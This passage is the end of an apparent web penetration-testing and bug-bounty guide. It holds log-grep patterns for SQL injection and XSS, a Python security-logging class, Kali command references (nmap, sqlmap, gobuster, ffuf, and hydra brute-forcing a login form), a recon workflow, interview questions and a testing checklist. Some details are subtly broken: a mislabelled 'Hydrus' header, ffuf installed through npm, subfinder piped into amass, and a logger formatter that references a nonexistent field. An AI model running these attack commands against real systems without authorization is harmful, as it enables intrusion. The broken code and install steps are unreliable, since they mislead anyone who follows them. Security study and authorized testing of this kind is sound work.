- Access to sensitive data
- Privilege escalation attempts
- Admin actions

Security Events
- SQL injection attempts
- XSS payloads
- CSRF tokens
- Rate limit violations

Business Events
- High-value transactions
- Data exports
- Configuration changes
```

### 20.2 Log Analysis Commands

```bash
# Search for SQL injection
grep -i "union\|select\|' or '1'='1" /var/log/apache2/access.log

# Find XSS attempts
grep -i "<script>\|onerror=\|onload=" /var/log/nginx/access.log

# Find scanning activity
awk '{print $1}' access.log | sort | uniq -c | sort -rn | head

# Failed login attempts
grep "POST /login" access.log | grep "401\|403"

# Commands for SIEM (Splunk format)
# index=web_logs action=failure
```

### 20.3 Setting Up Logging

```python
# Python - Structured logging
import logging
import json

class SecurityLogger:
    def __init__(self):
        self.logger = logging.getLogger('security')
        handler = logging.FileHandler('security.log')
        formatter = json.dumps({
            'timestamp': '%(asctime)s',
            'level': '%(levelname)s',
            'message': '%(message)s',
            'ip': '%(clientip)s'
        })
        handler.setFormatter(logging.Formatter(formatter))
        self.logger.addHandler(handler)
    
    def log_auth_attempt(self, username, success, ip):
        self.logger.info({
            'event': 'auth_attempt',
            'username': username,
            'success': success,
            'ip': ip
        })
    
    def log_sqli_attempt(self, payload, ip):
        self.logger.warning({
            'event': 'sqli_attempt',
            'payload': payload,
            'ip': ip
        })
```

---

## QUICK REFERENCE COMMANDS

### Essential Kali Linux Commands

```bash
# === Nmap ===
nmap -sV -sC -O target.com
nmap -p- target.com
nmap --script=vuln target.com

# === Gobuster ===
gobuster dir -u https://target.com -w /usr/share/wordlists/dirb/common.txt
gobuster dns -d target.com -w /usr/share/wordlists/subdomains.txt

# === SQLMap ===
sqlmap -u "https://target.com/?id=1" --batch --dbs
sqlmap -u "https://target.com/" --data="user=admin" --level=5

# === Nikto ===
nikto -h https://target.com

# === Burp Suite ===
# Proxy -> Intercept -> Modify -> Forward
# Intruder -> Attack -> Payloads
# Repeater -> Manual testing

# === FFUF ===
ffuf -w wordlist.txt -u https://target.com/FUZZ

# === Hydrus ===
hydra -l admin -P passwords.txt target.com http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"
```

---

## COMMON BUG BOUNTY WORKFLOW

```bash
# 1. Reconnaissance
subfinder -d target.com | amass enum -passive -d target.com

# 2. Subdomain enumeration
assetfinder target.com | tee subdomains.txt

# 3. Screenshot all subdomains
aquatone-discover -d target.com

# 4. Port scanning
nmap -iL subdomains.txt -p 80,443,8080 -oA portscan

# 5. Directory enumeration
ffuf -w wordlist.txt -u https://subdomain.target.com/FUZZ -o fuzz_results.json

# 6. Test for vulnerabilities
# - XSS with dalfox
# - SQLi with sqlmap
# - Open redirects with gf
# - SSRF with interlace

# 7. Manual testing
# - Check all parameters
# - Test authentication flows
# - Review JavaScript files for secrets
```

---

## INTERVIEW PREPARATION

### Behavioral Questions

1. "Tell me about a challenging finding."
2. "How do you stay updated on vulnerabilities?"
3. "Describe your bug bounty process."
4. "What's your most impressive finding?"

### Technical Questions

1. **XSS vs CSRF**: What's the difference?
2. **SQLi vs NoSQLi**: How do they differ?
3. **SSRF vs CSRF**: When would you use each concept?
4. **Authentication vs Authorization**: Explain the difference.
5. **IDOR vs Broken Access Control**: Are they the same?

### Practical Scenarios

1. "You find a reflected XSS. What's your attack chain?"
2. "How would you exploit an SSRF on AWS?"
3. "Walk me through testing a login portal."
4. "How do you test for IDOR in an API?"

---

## TOOL INSTALLATION QUICK REFERENCE

```bash
# Install essential tools
sudo apt update
sudo apt install nmap sqlmap nikto gobuster dirb hydra

# Install Python tools
pip3 install sqlmap bs4 requests

# Install JavaScript tools
npm install -g ffuf

# Burp Suite
# Download from: https://portswigger.net/burp

# OWASP ZAP
sudo apt install zaproxy
```

---

## SECURITY CHECKLIST

### Before Testing
- [ ] Have permission (scope, legal)
- [ ] Understand rules of engagement
- [ ] Document everything
- [ ] Set up Burp Suite properly
- [ ] Use VPN/clean environment

### During Testing
- [ ] Test all parameters
- [ ] Check authentication flows
- [ ] Look for IDORs
- [ ] Test for injection
- [ ] Check API endpoints
- [ ] Review JavaScript files
- [ ] Test file uploads
- [ ] Check cloud configurations

### After Testing
- [ ] Document findings with PoC
- [ ] Calculate CVSS score
- [ ] Provide remediation
- [ ] Submit report
- [ ] Follow up if needed

---

## CVSS SCORE REFERENCE

| Score | Rating | Severity |
|-------|--------|----------|
| 0.0 | None | - |
| 0.1-3.9 | Low | Low |
| 4.0-6.9 | Medium | Medium |
| 7.0-8.9 | High | High |
| 9.0-10.0 | Critical | Critical |

### CVSS Vector Example
```
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
```

---

## RESOURCES

### Documentation
- OWASP Top 10: https://owasp.org/www-project-top-ten/
- PortSwigger Web Security Academy: https://portswigger.net/web-security
- NIST NVD: https://nvd.nist.gov/

### Tools
- Burp Suite: https://portswigger.net/burp
- OWASP ZAP: https://www.zaproxy.org/
- Nmap: https://nmap.org/
- SQLMap: http://sqlmap.org/

### Practice
- HackTheBox: https://www.hackthebox.eu/
- TryHackMe: https://tryhackme.com/
- DVWA: http://dvwa.co.uk/
- WebGoat: https://owasp.org/www-project-webgoat/

---

*This guide is for educational and authorized testing purposes only.*
*Always obtain proper authorization before testing any system.*
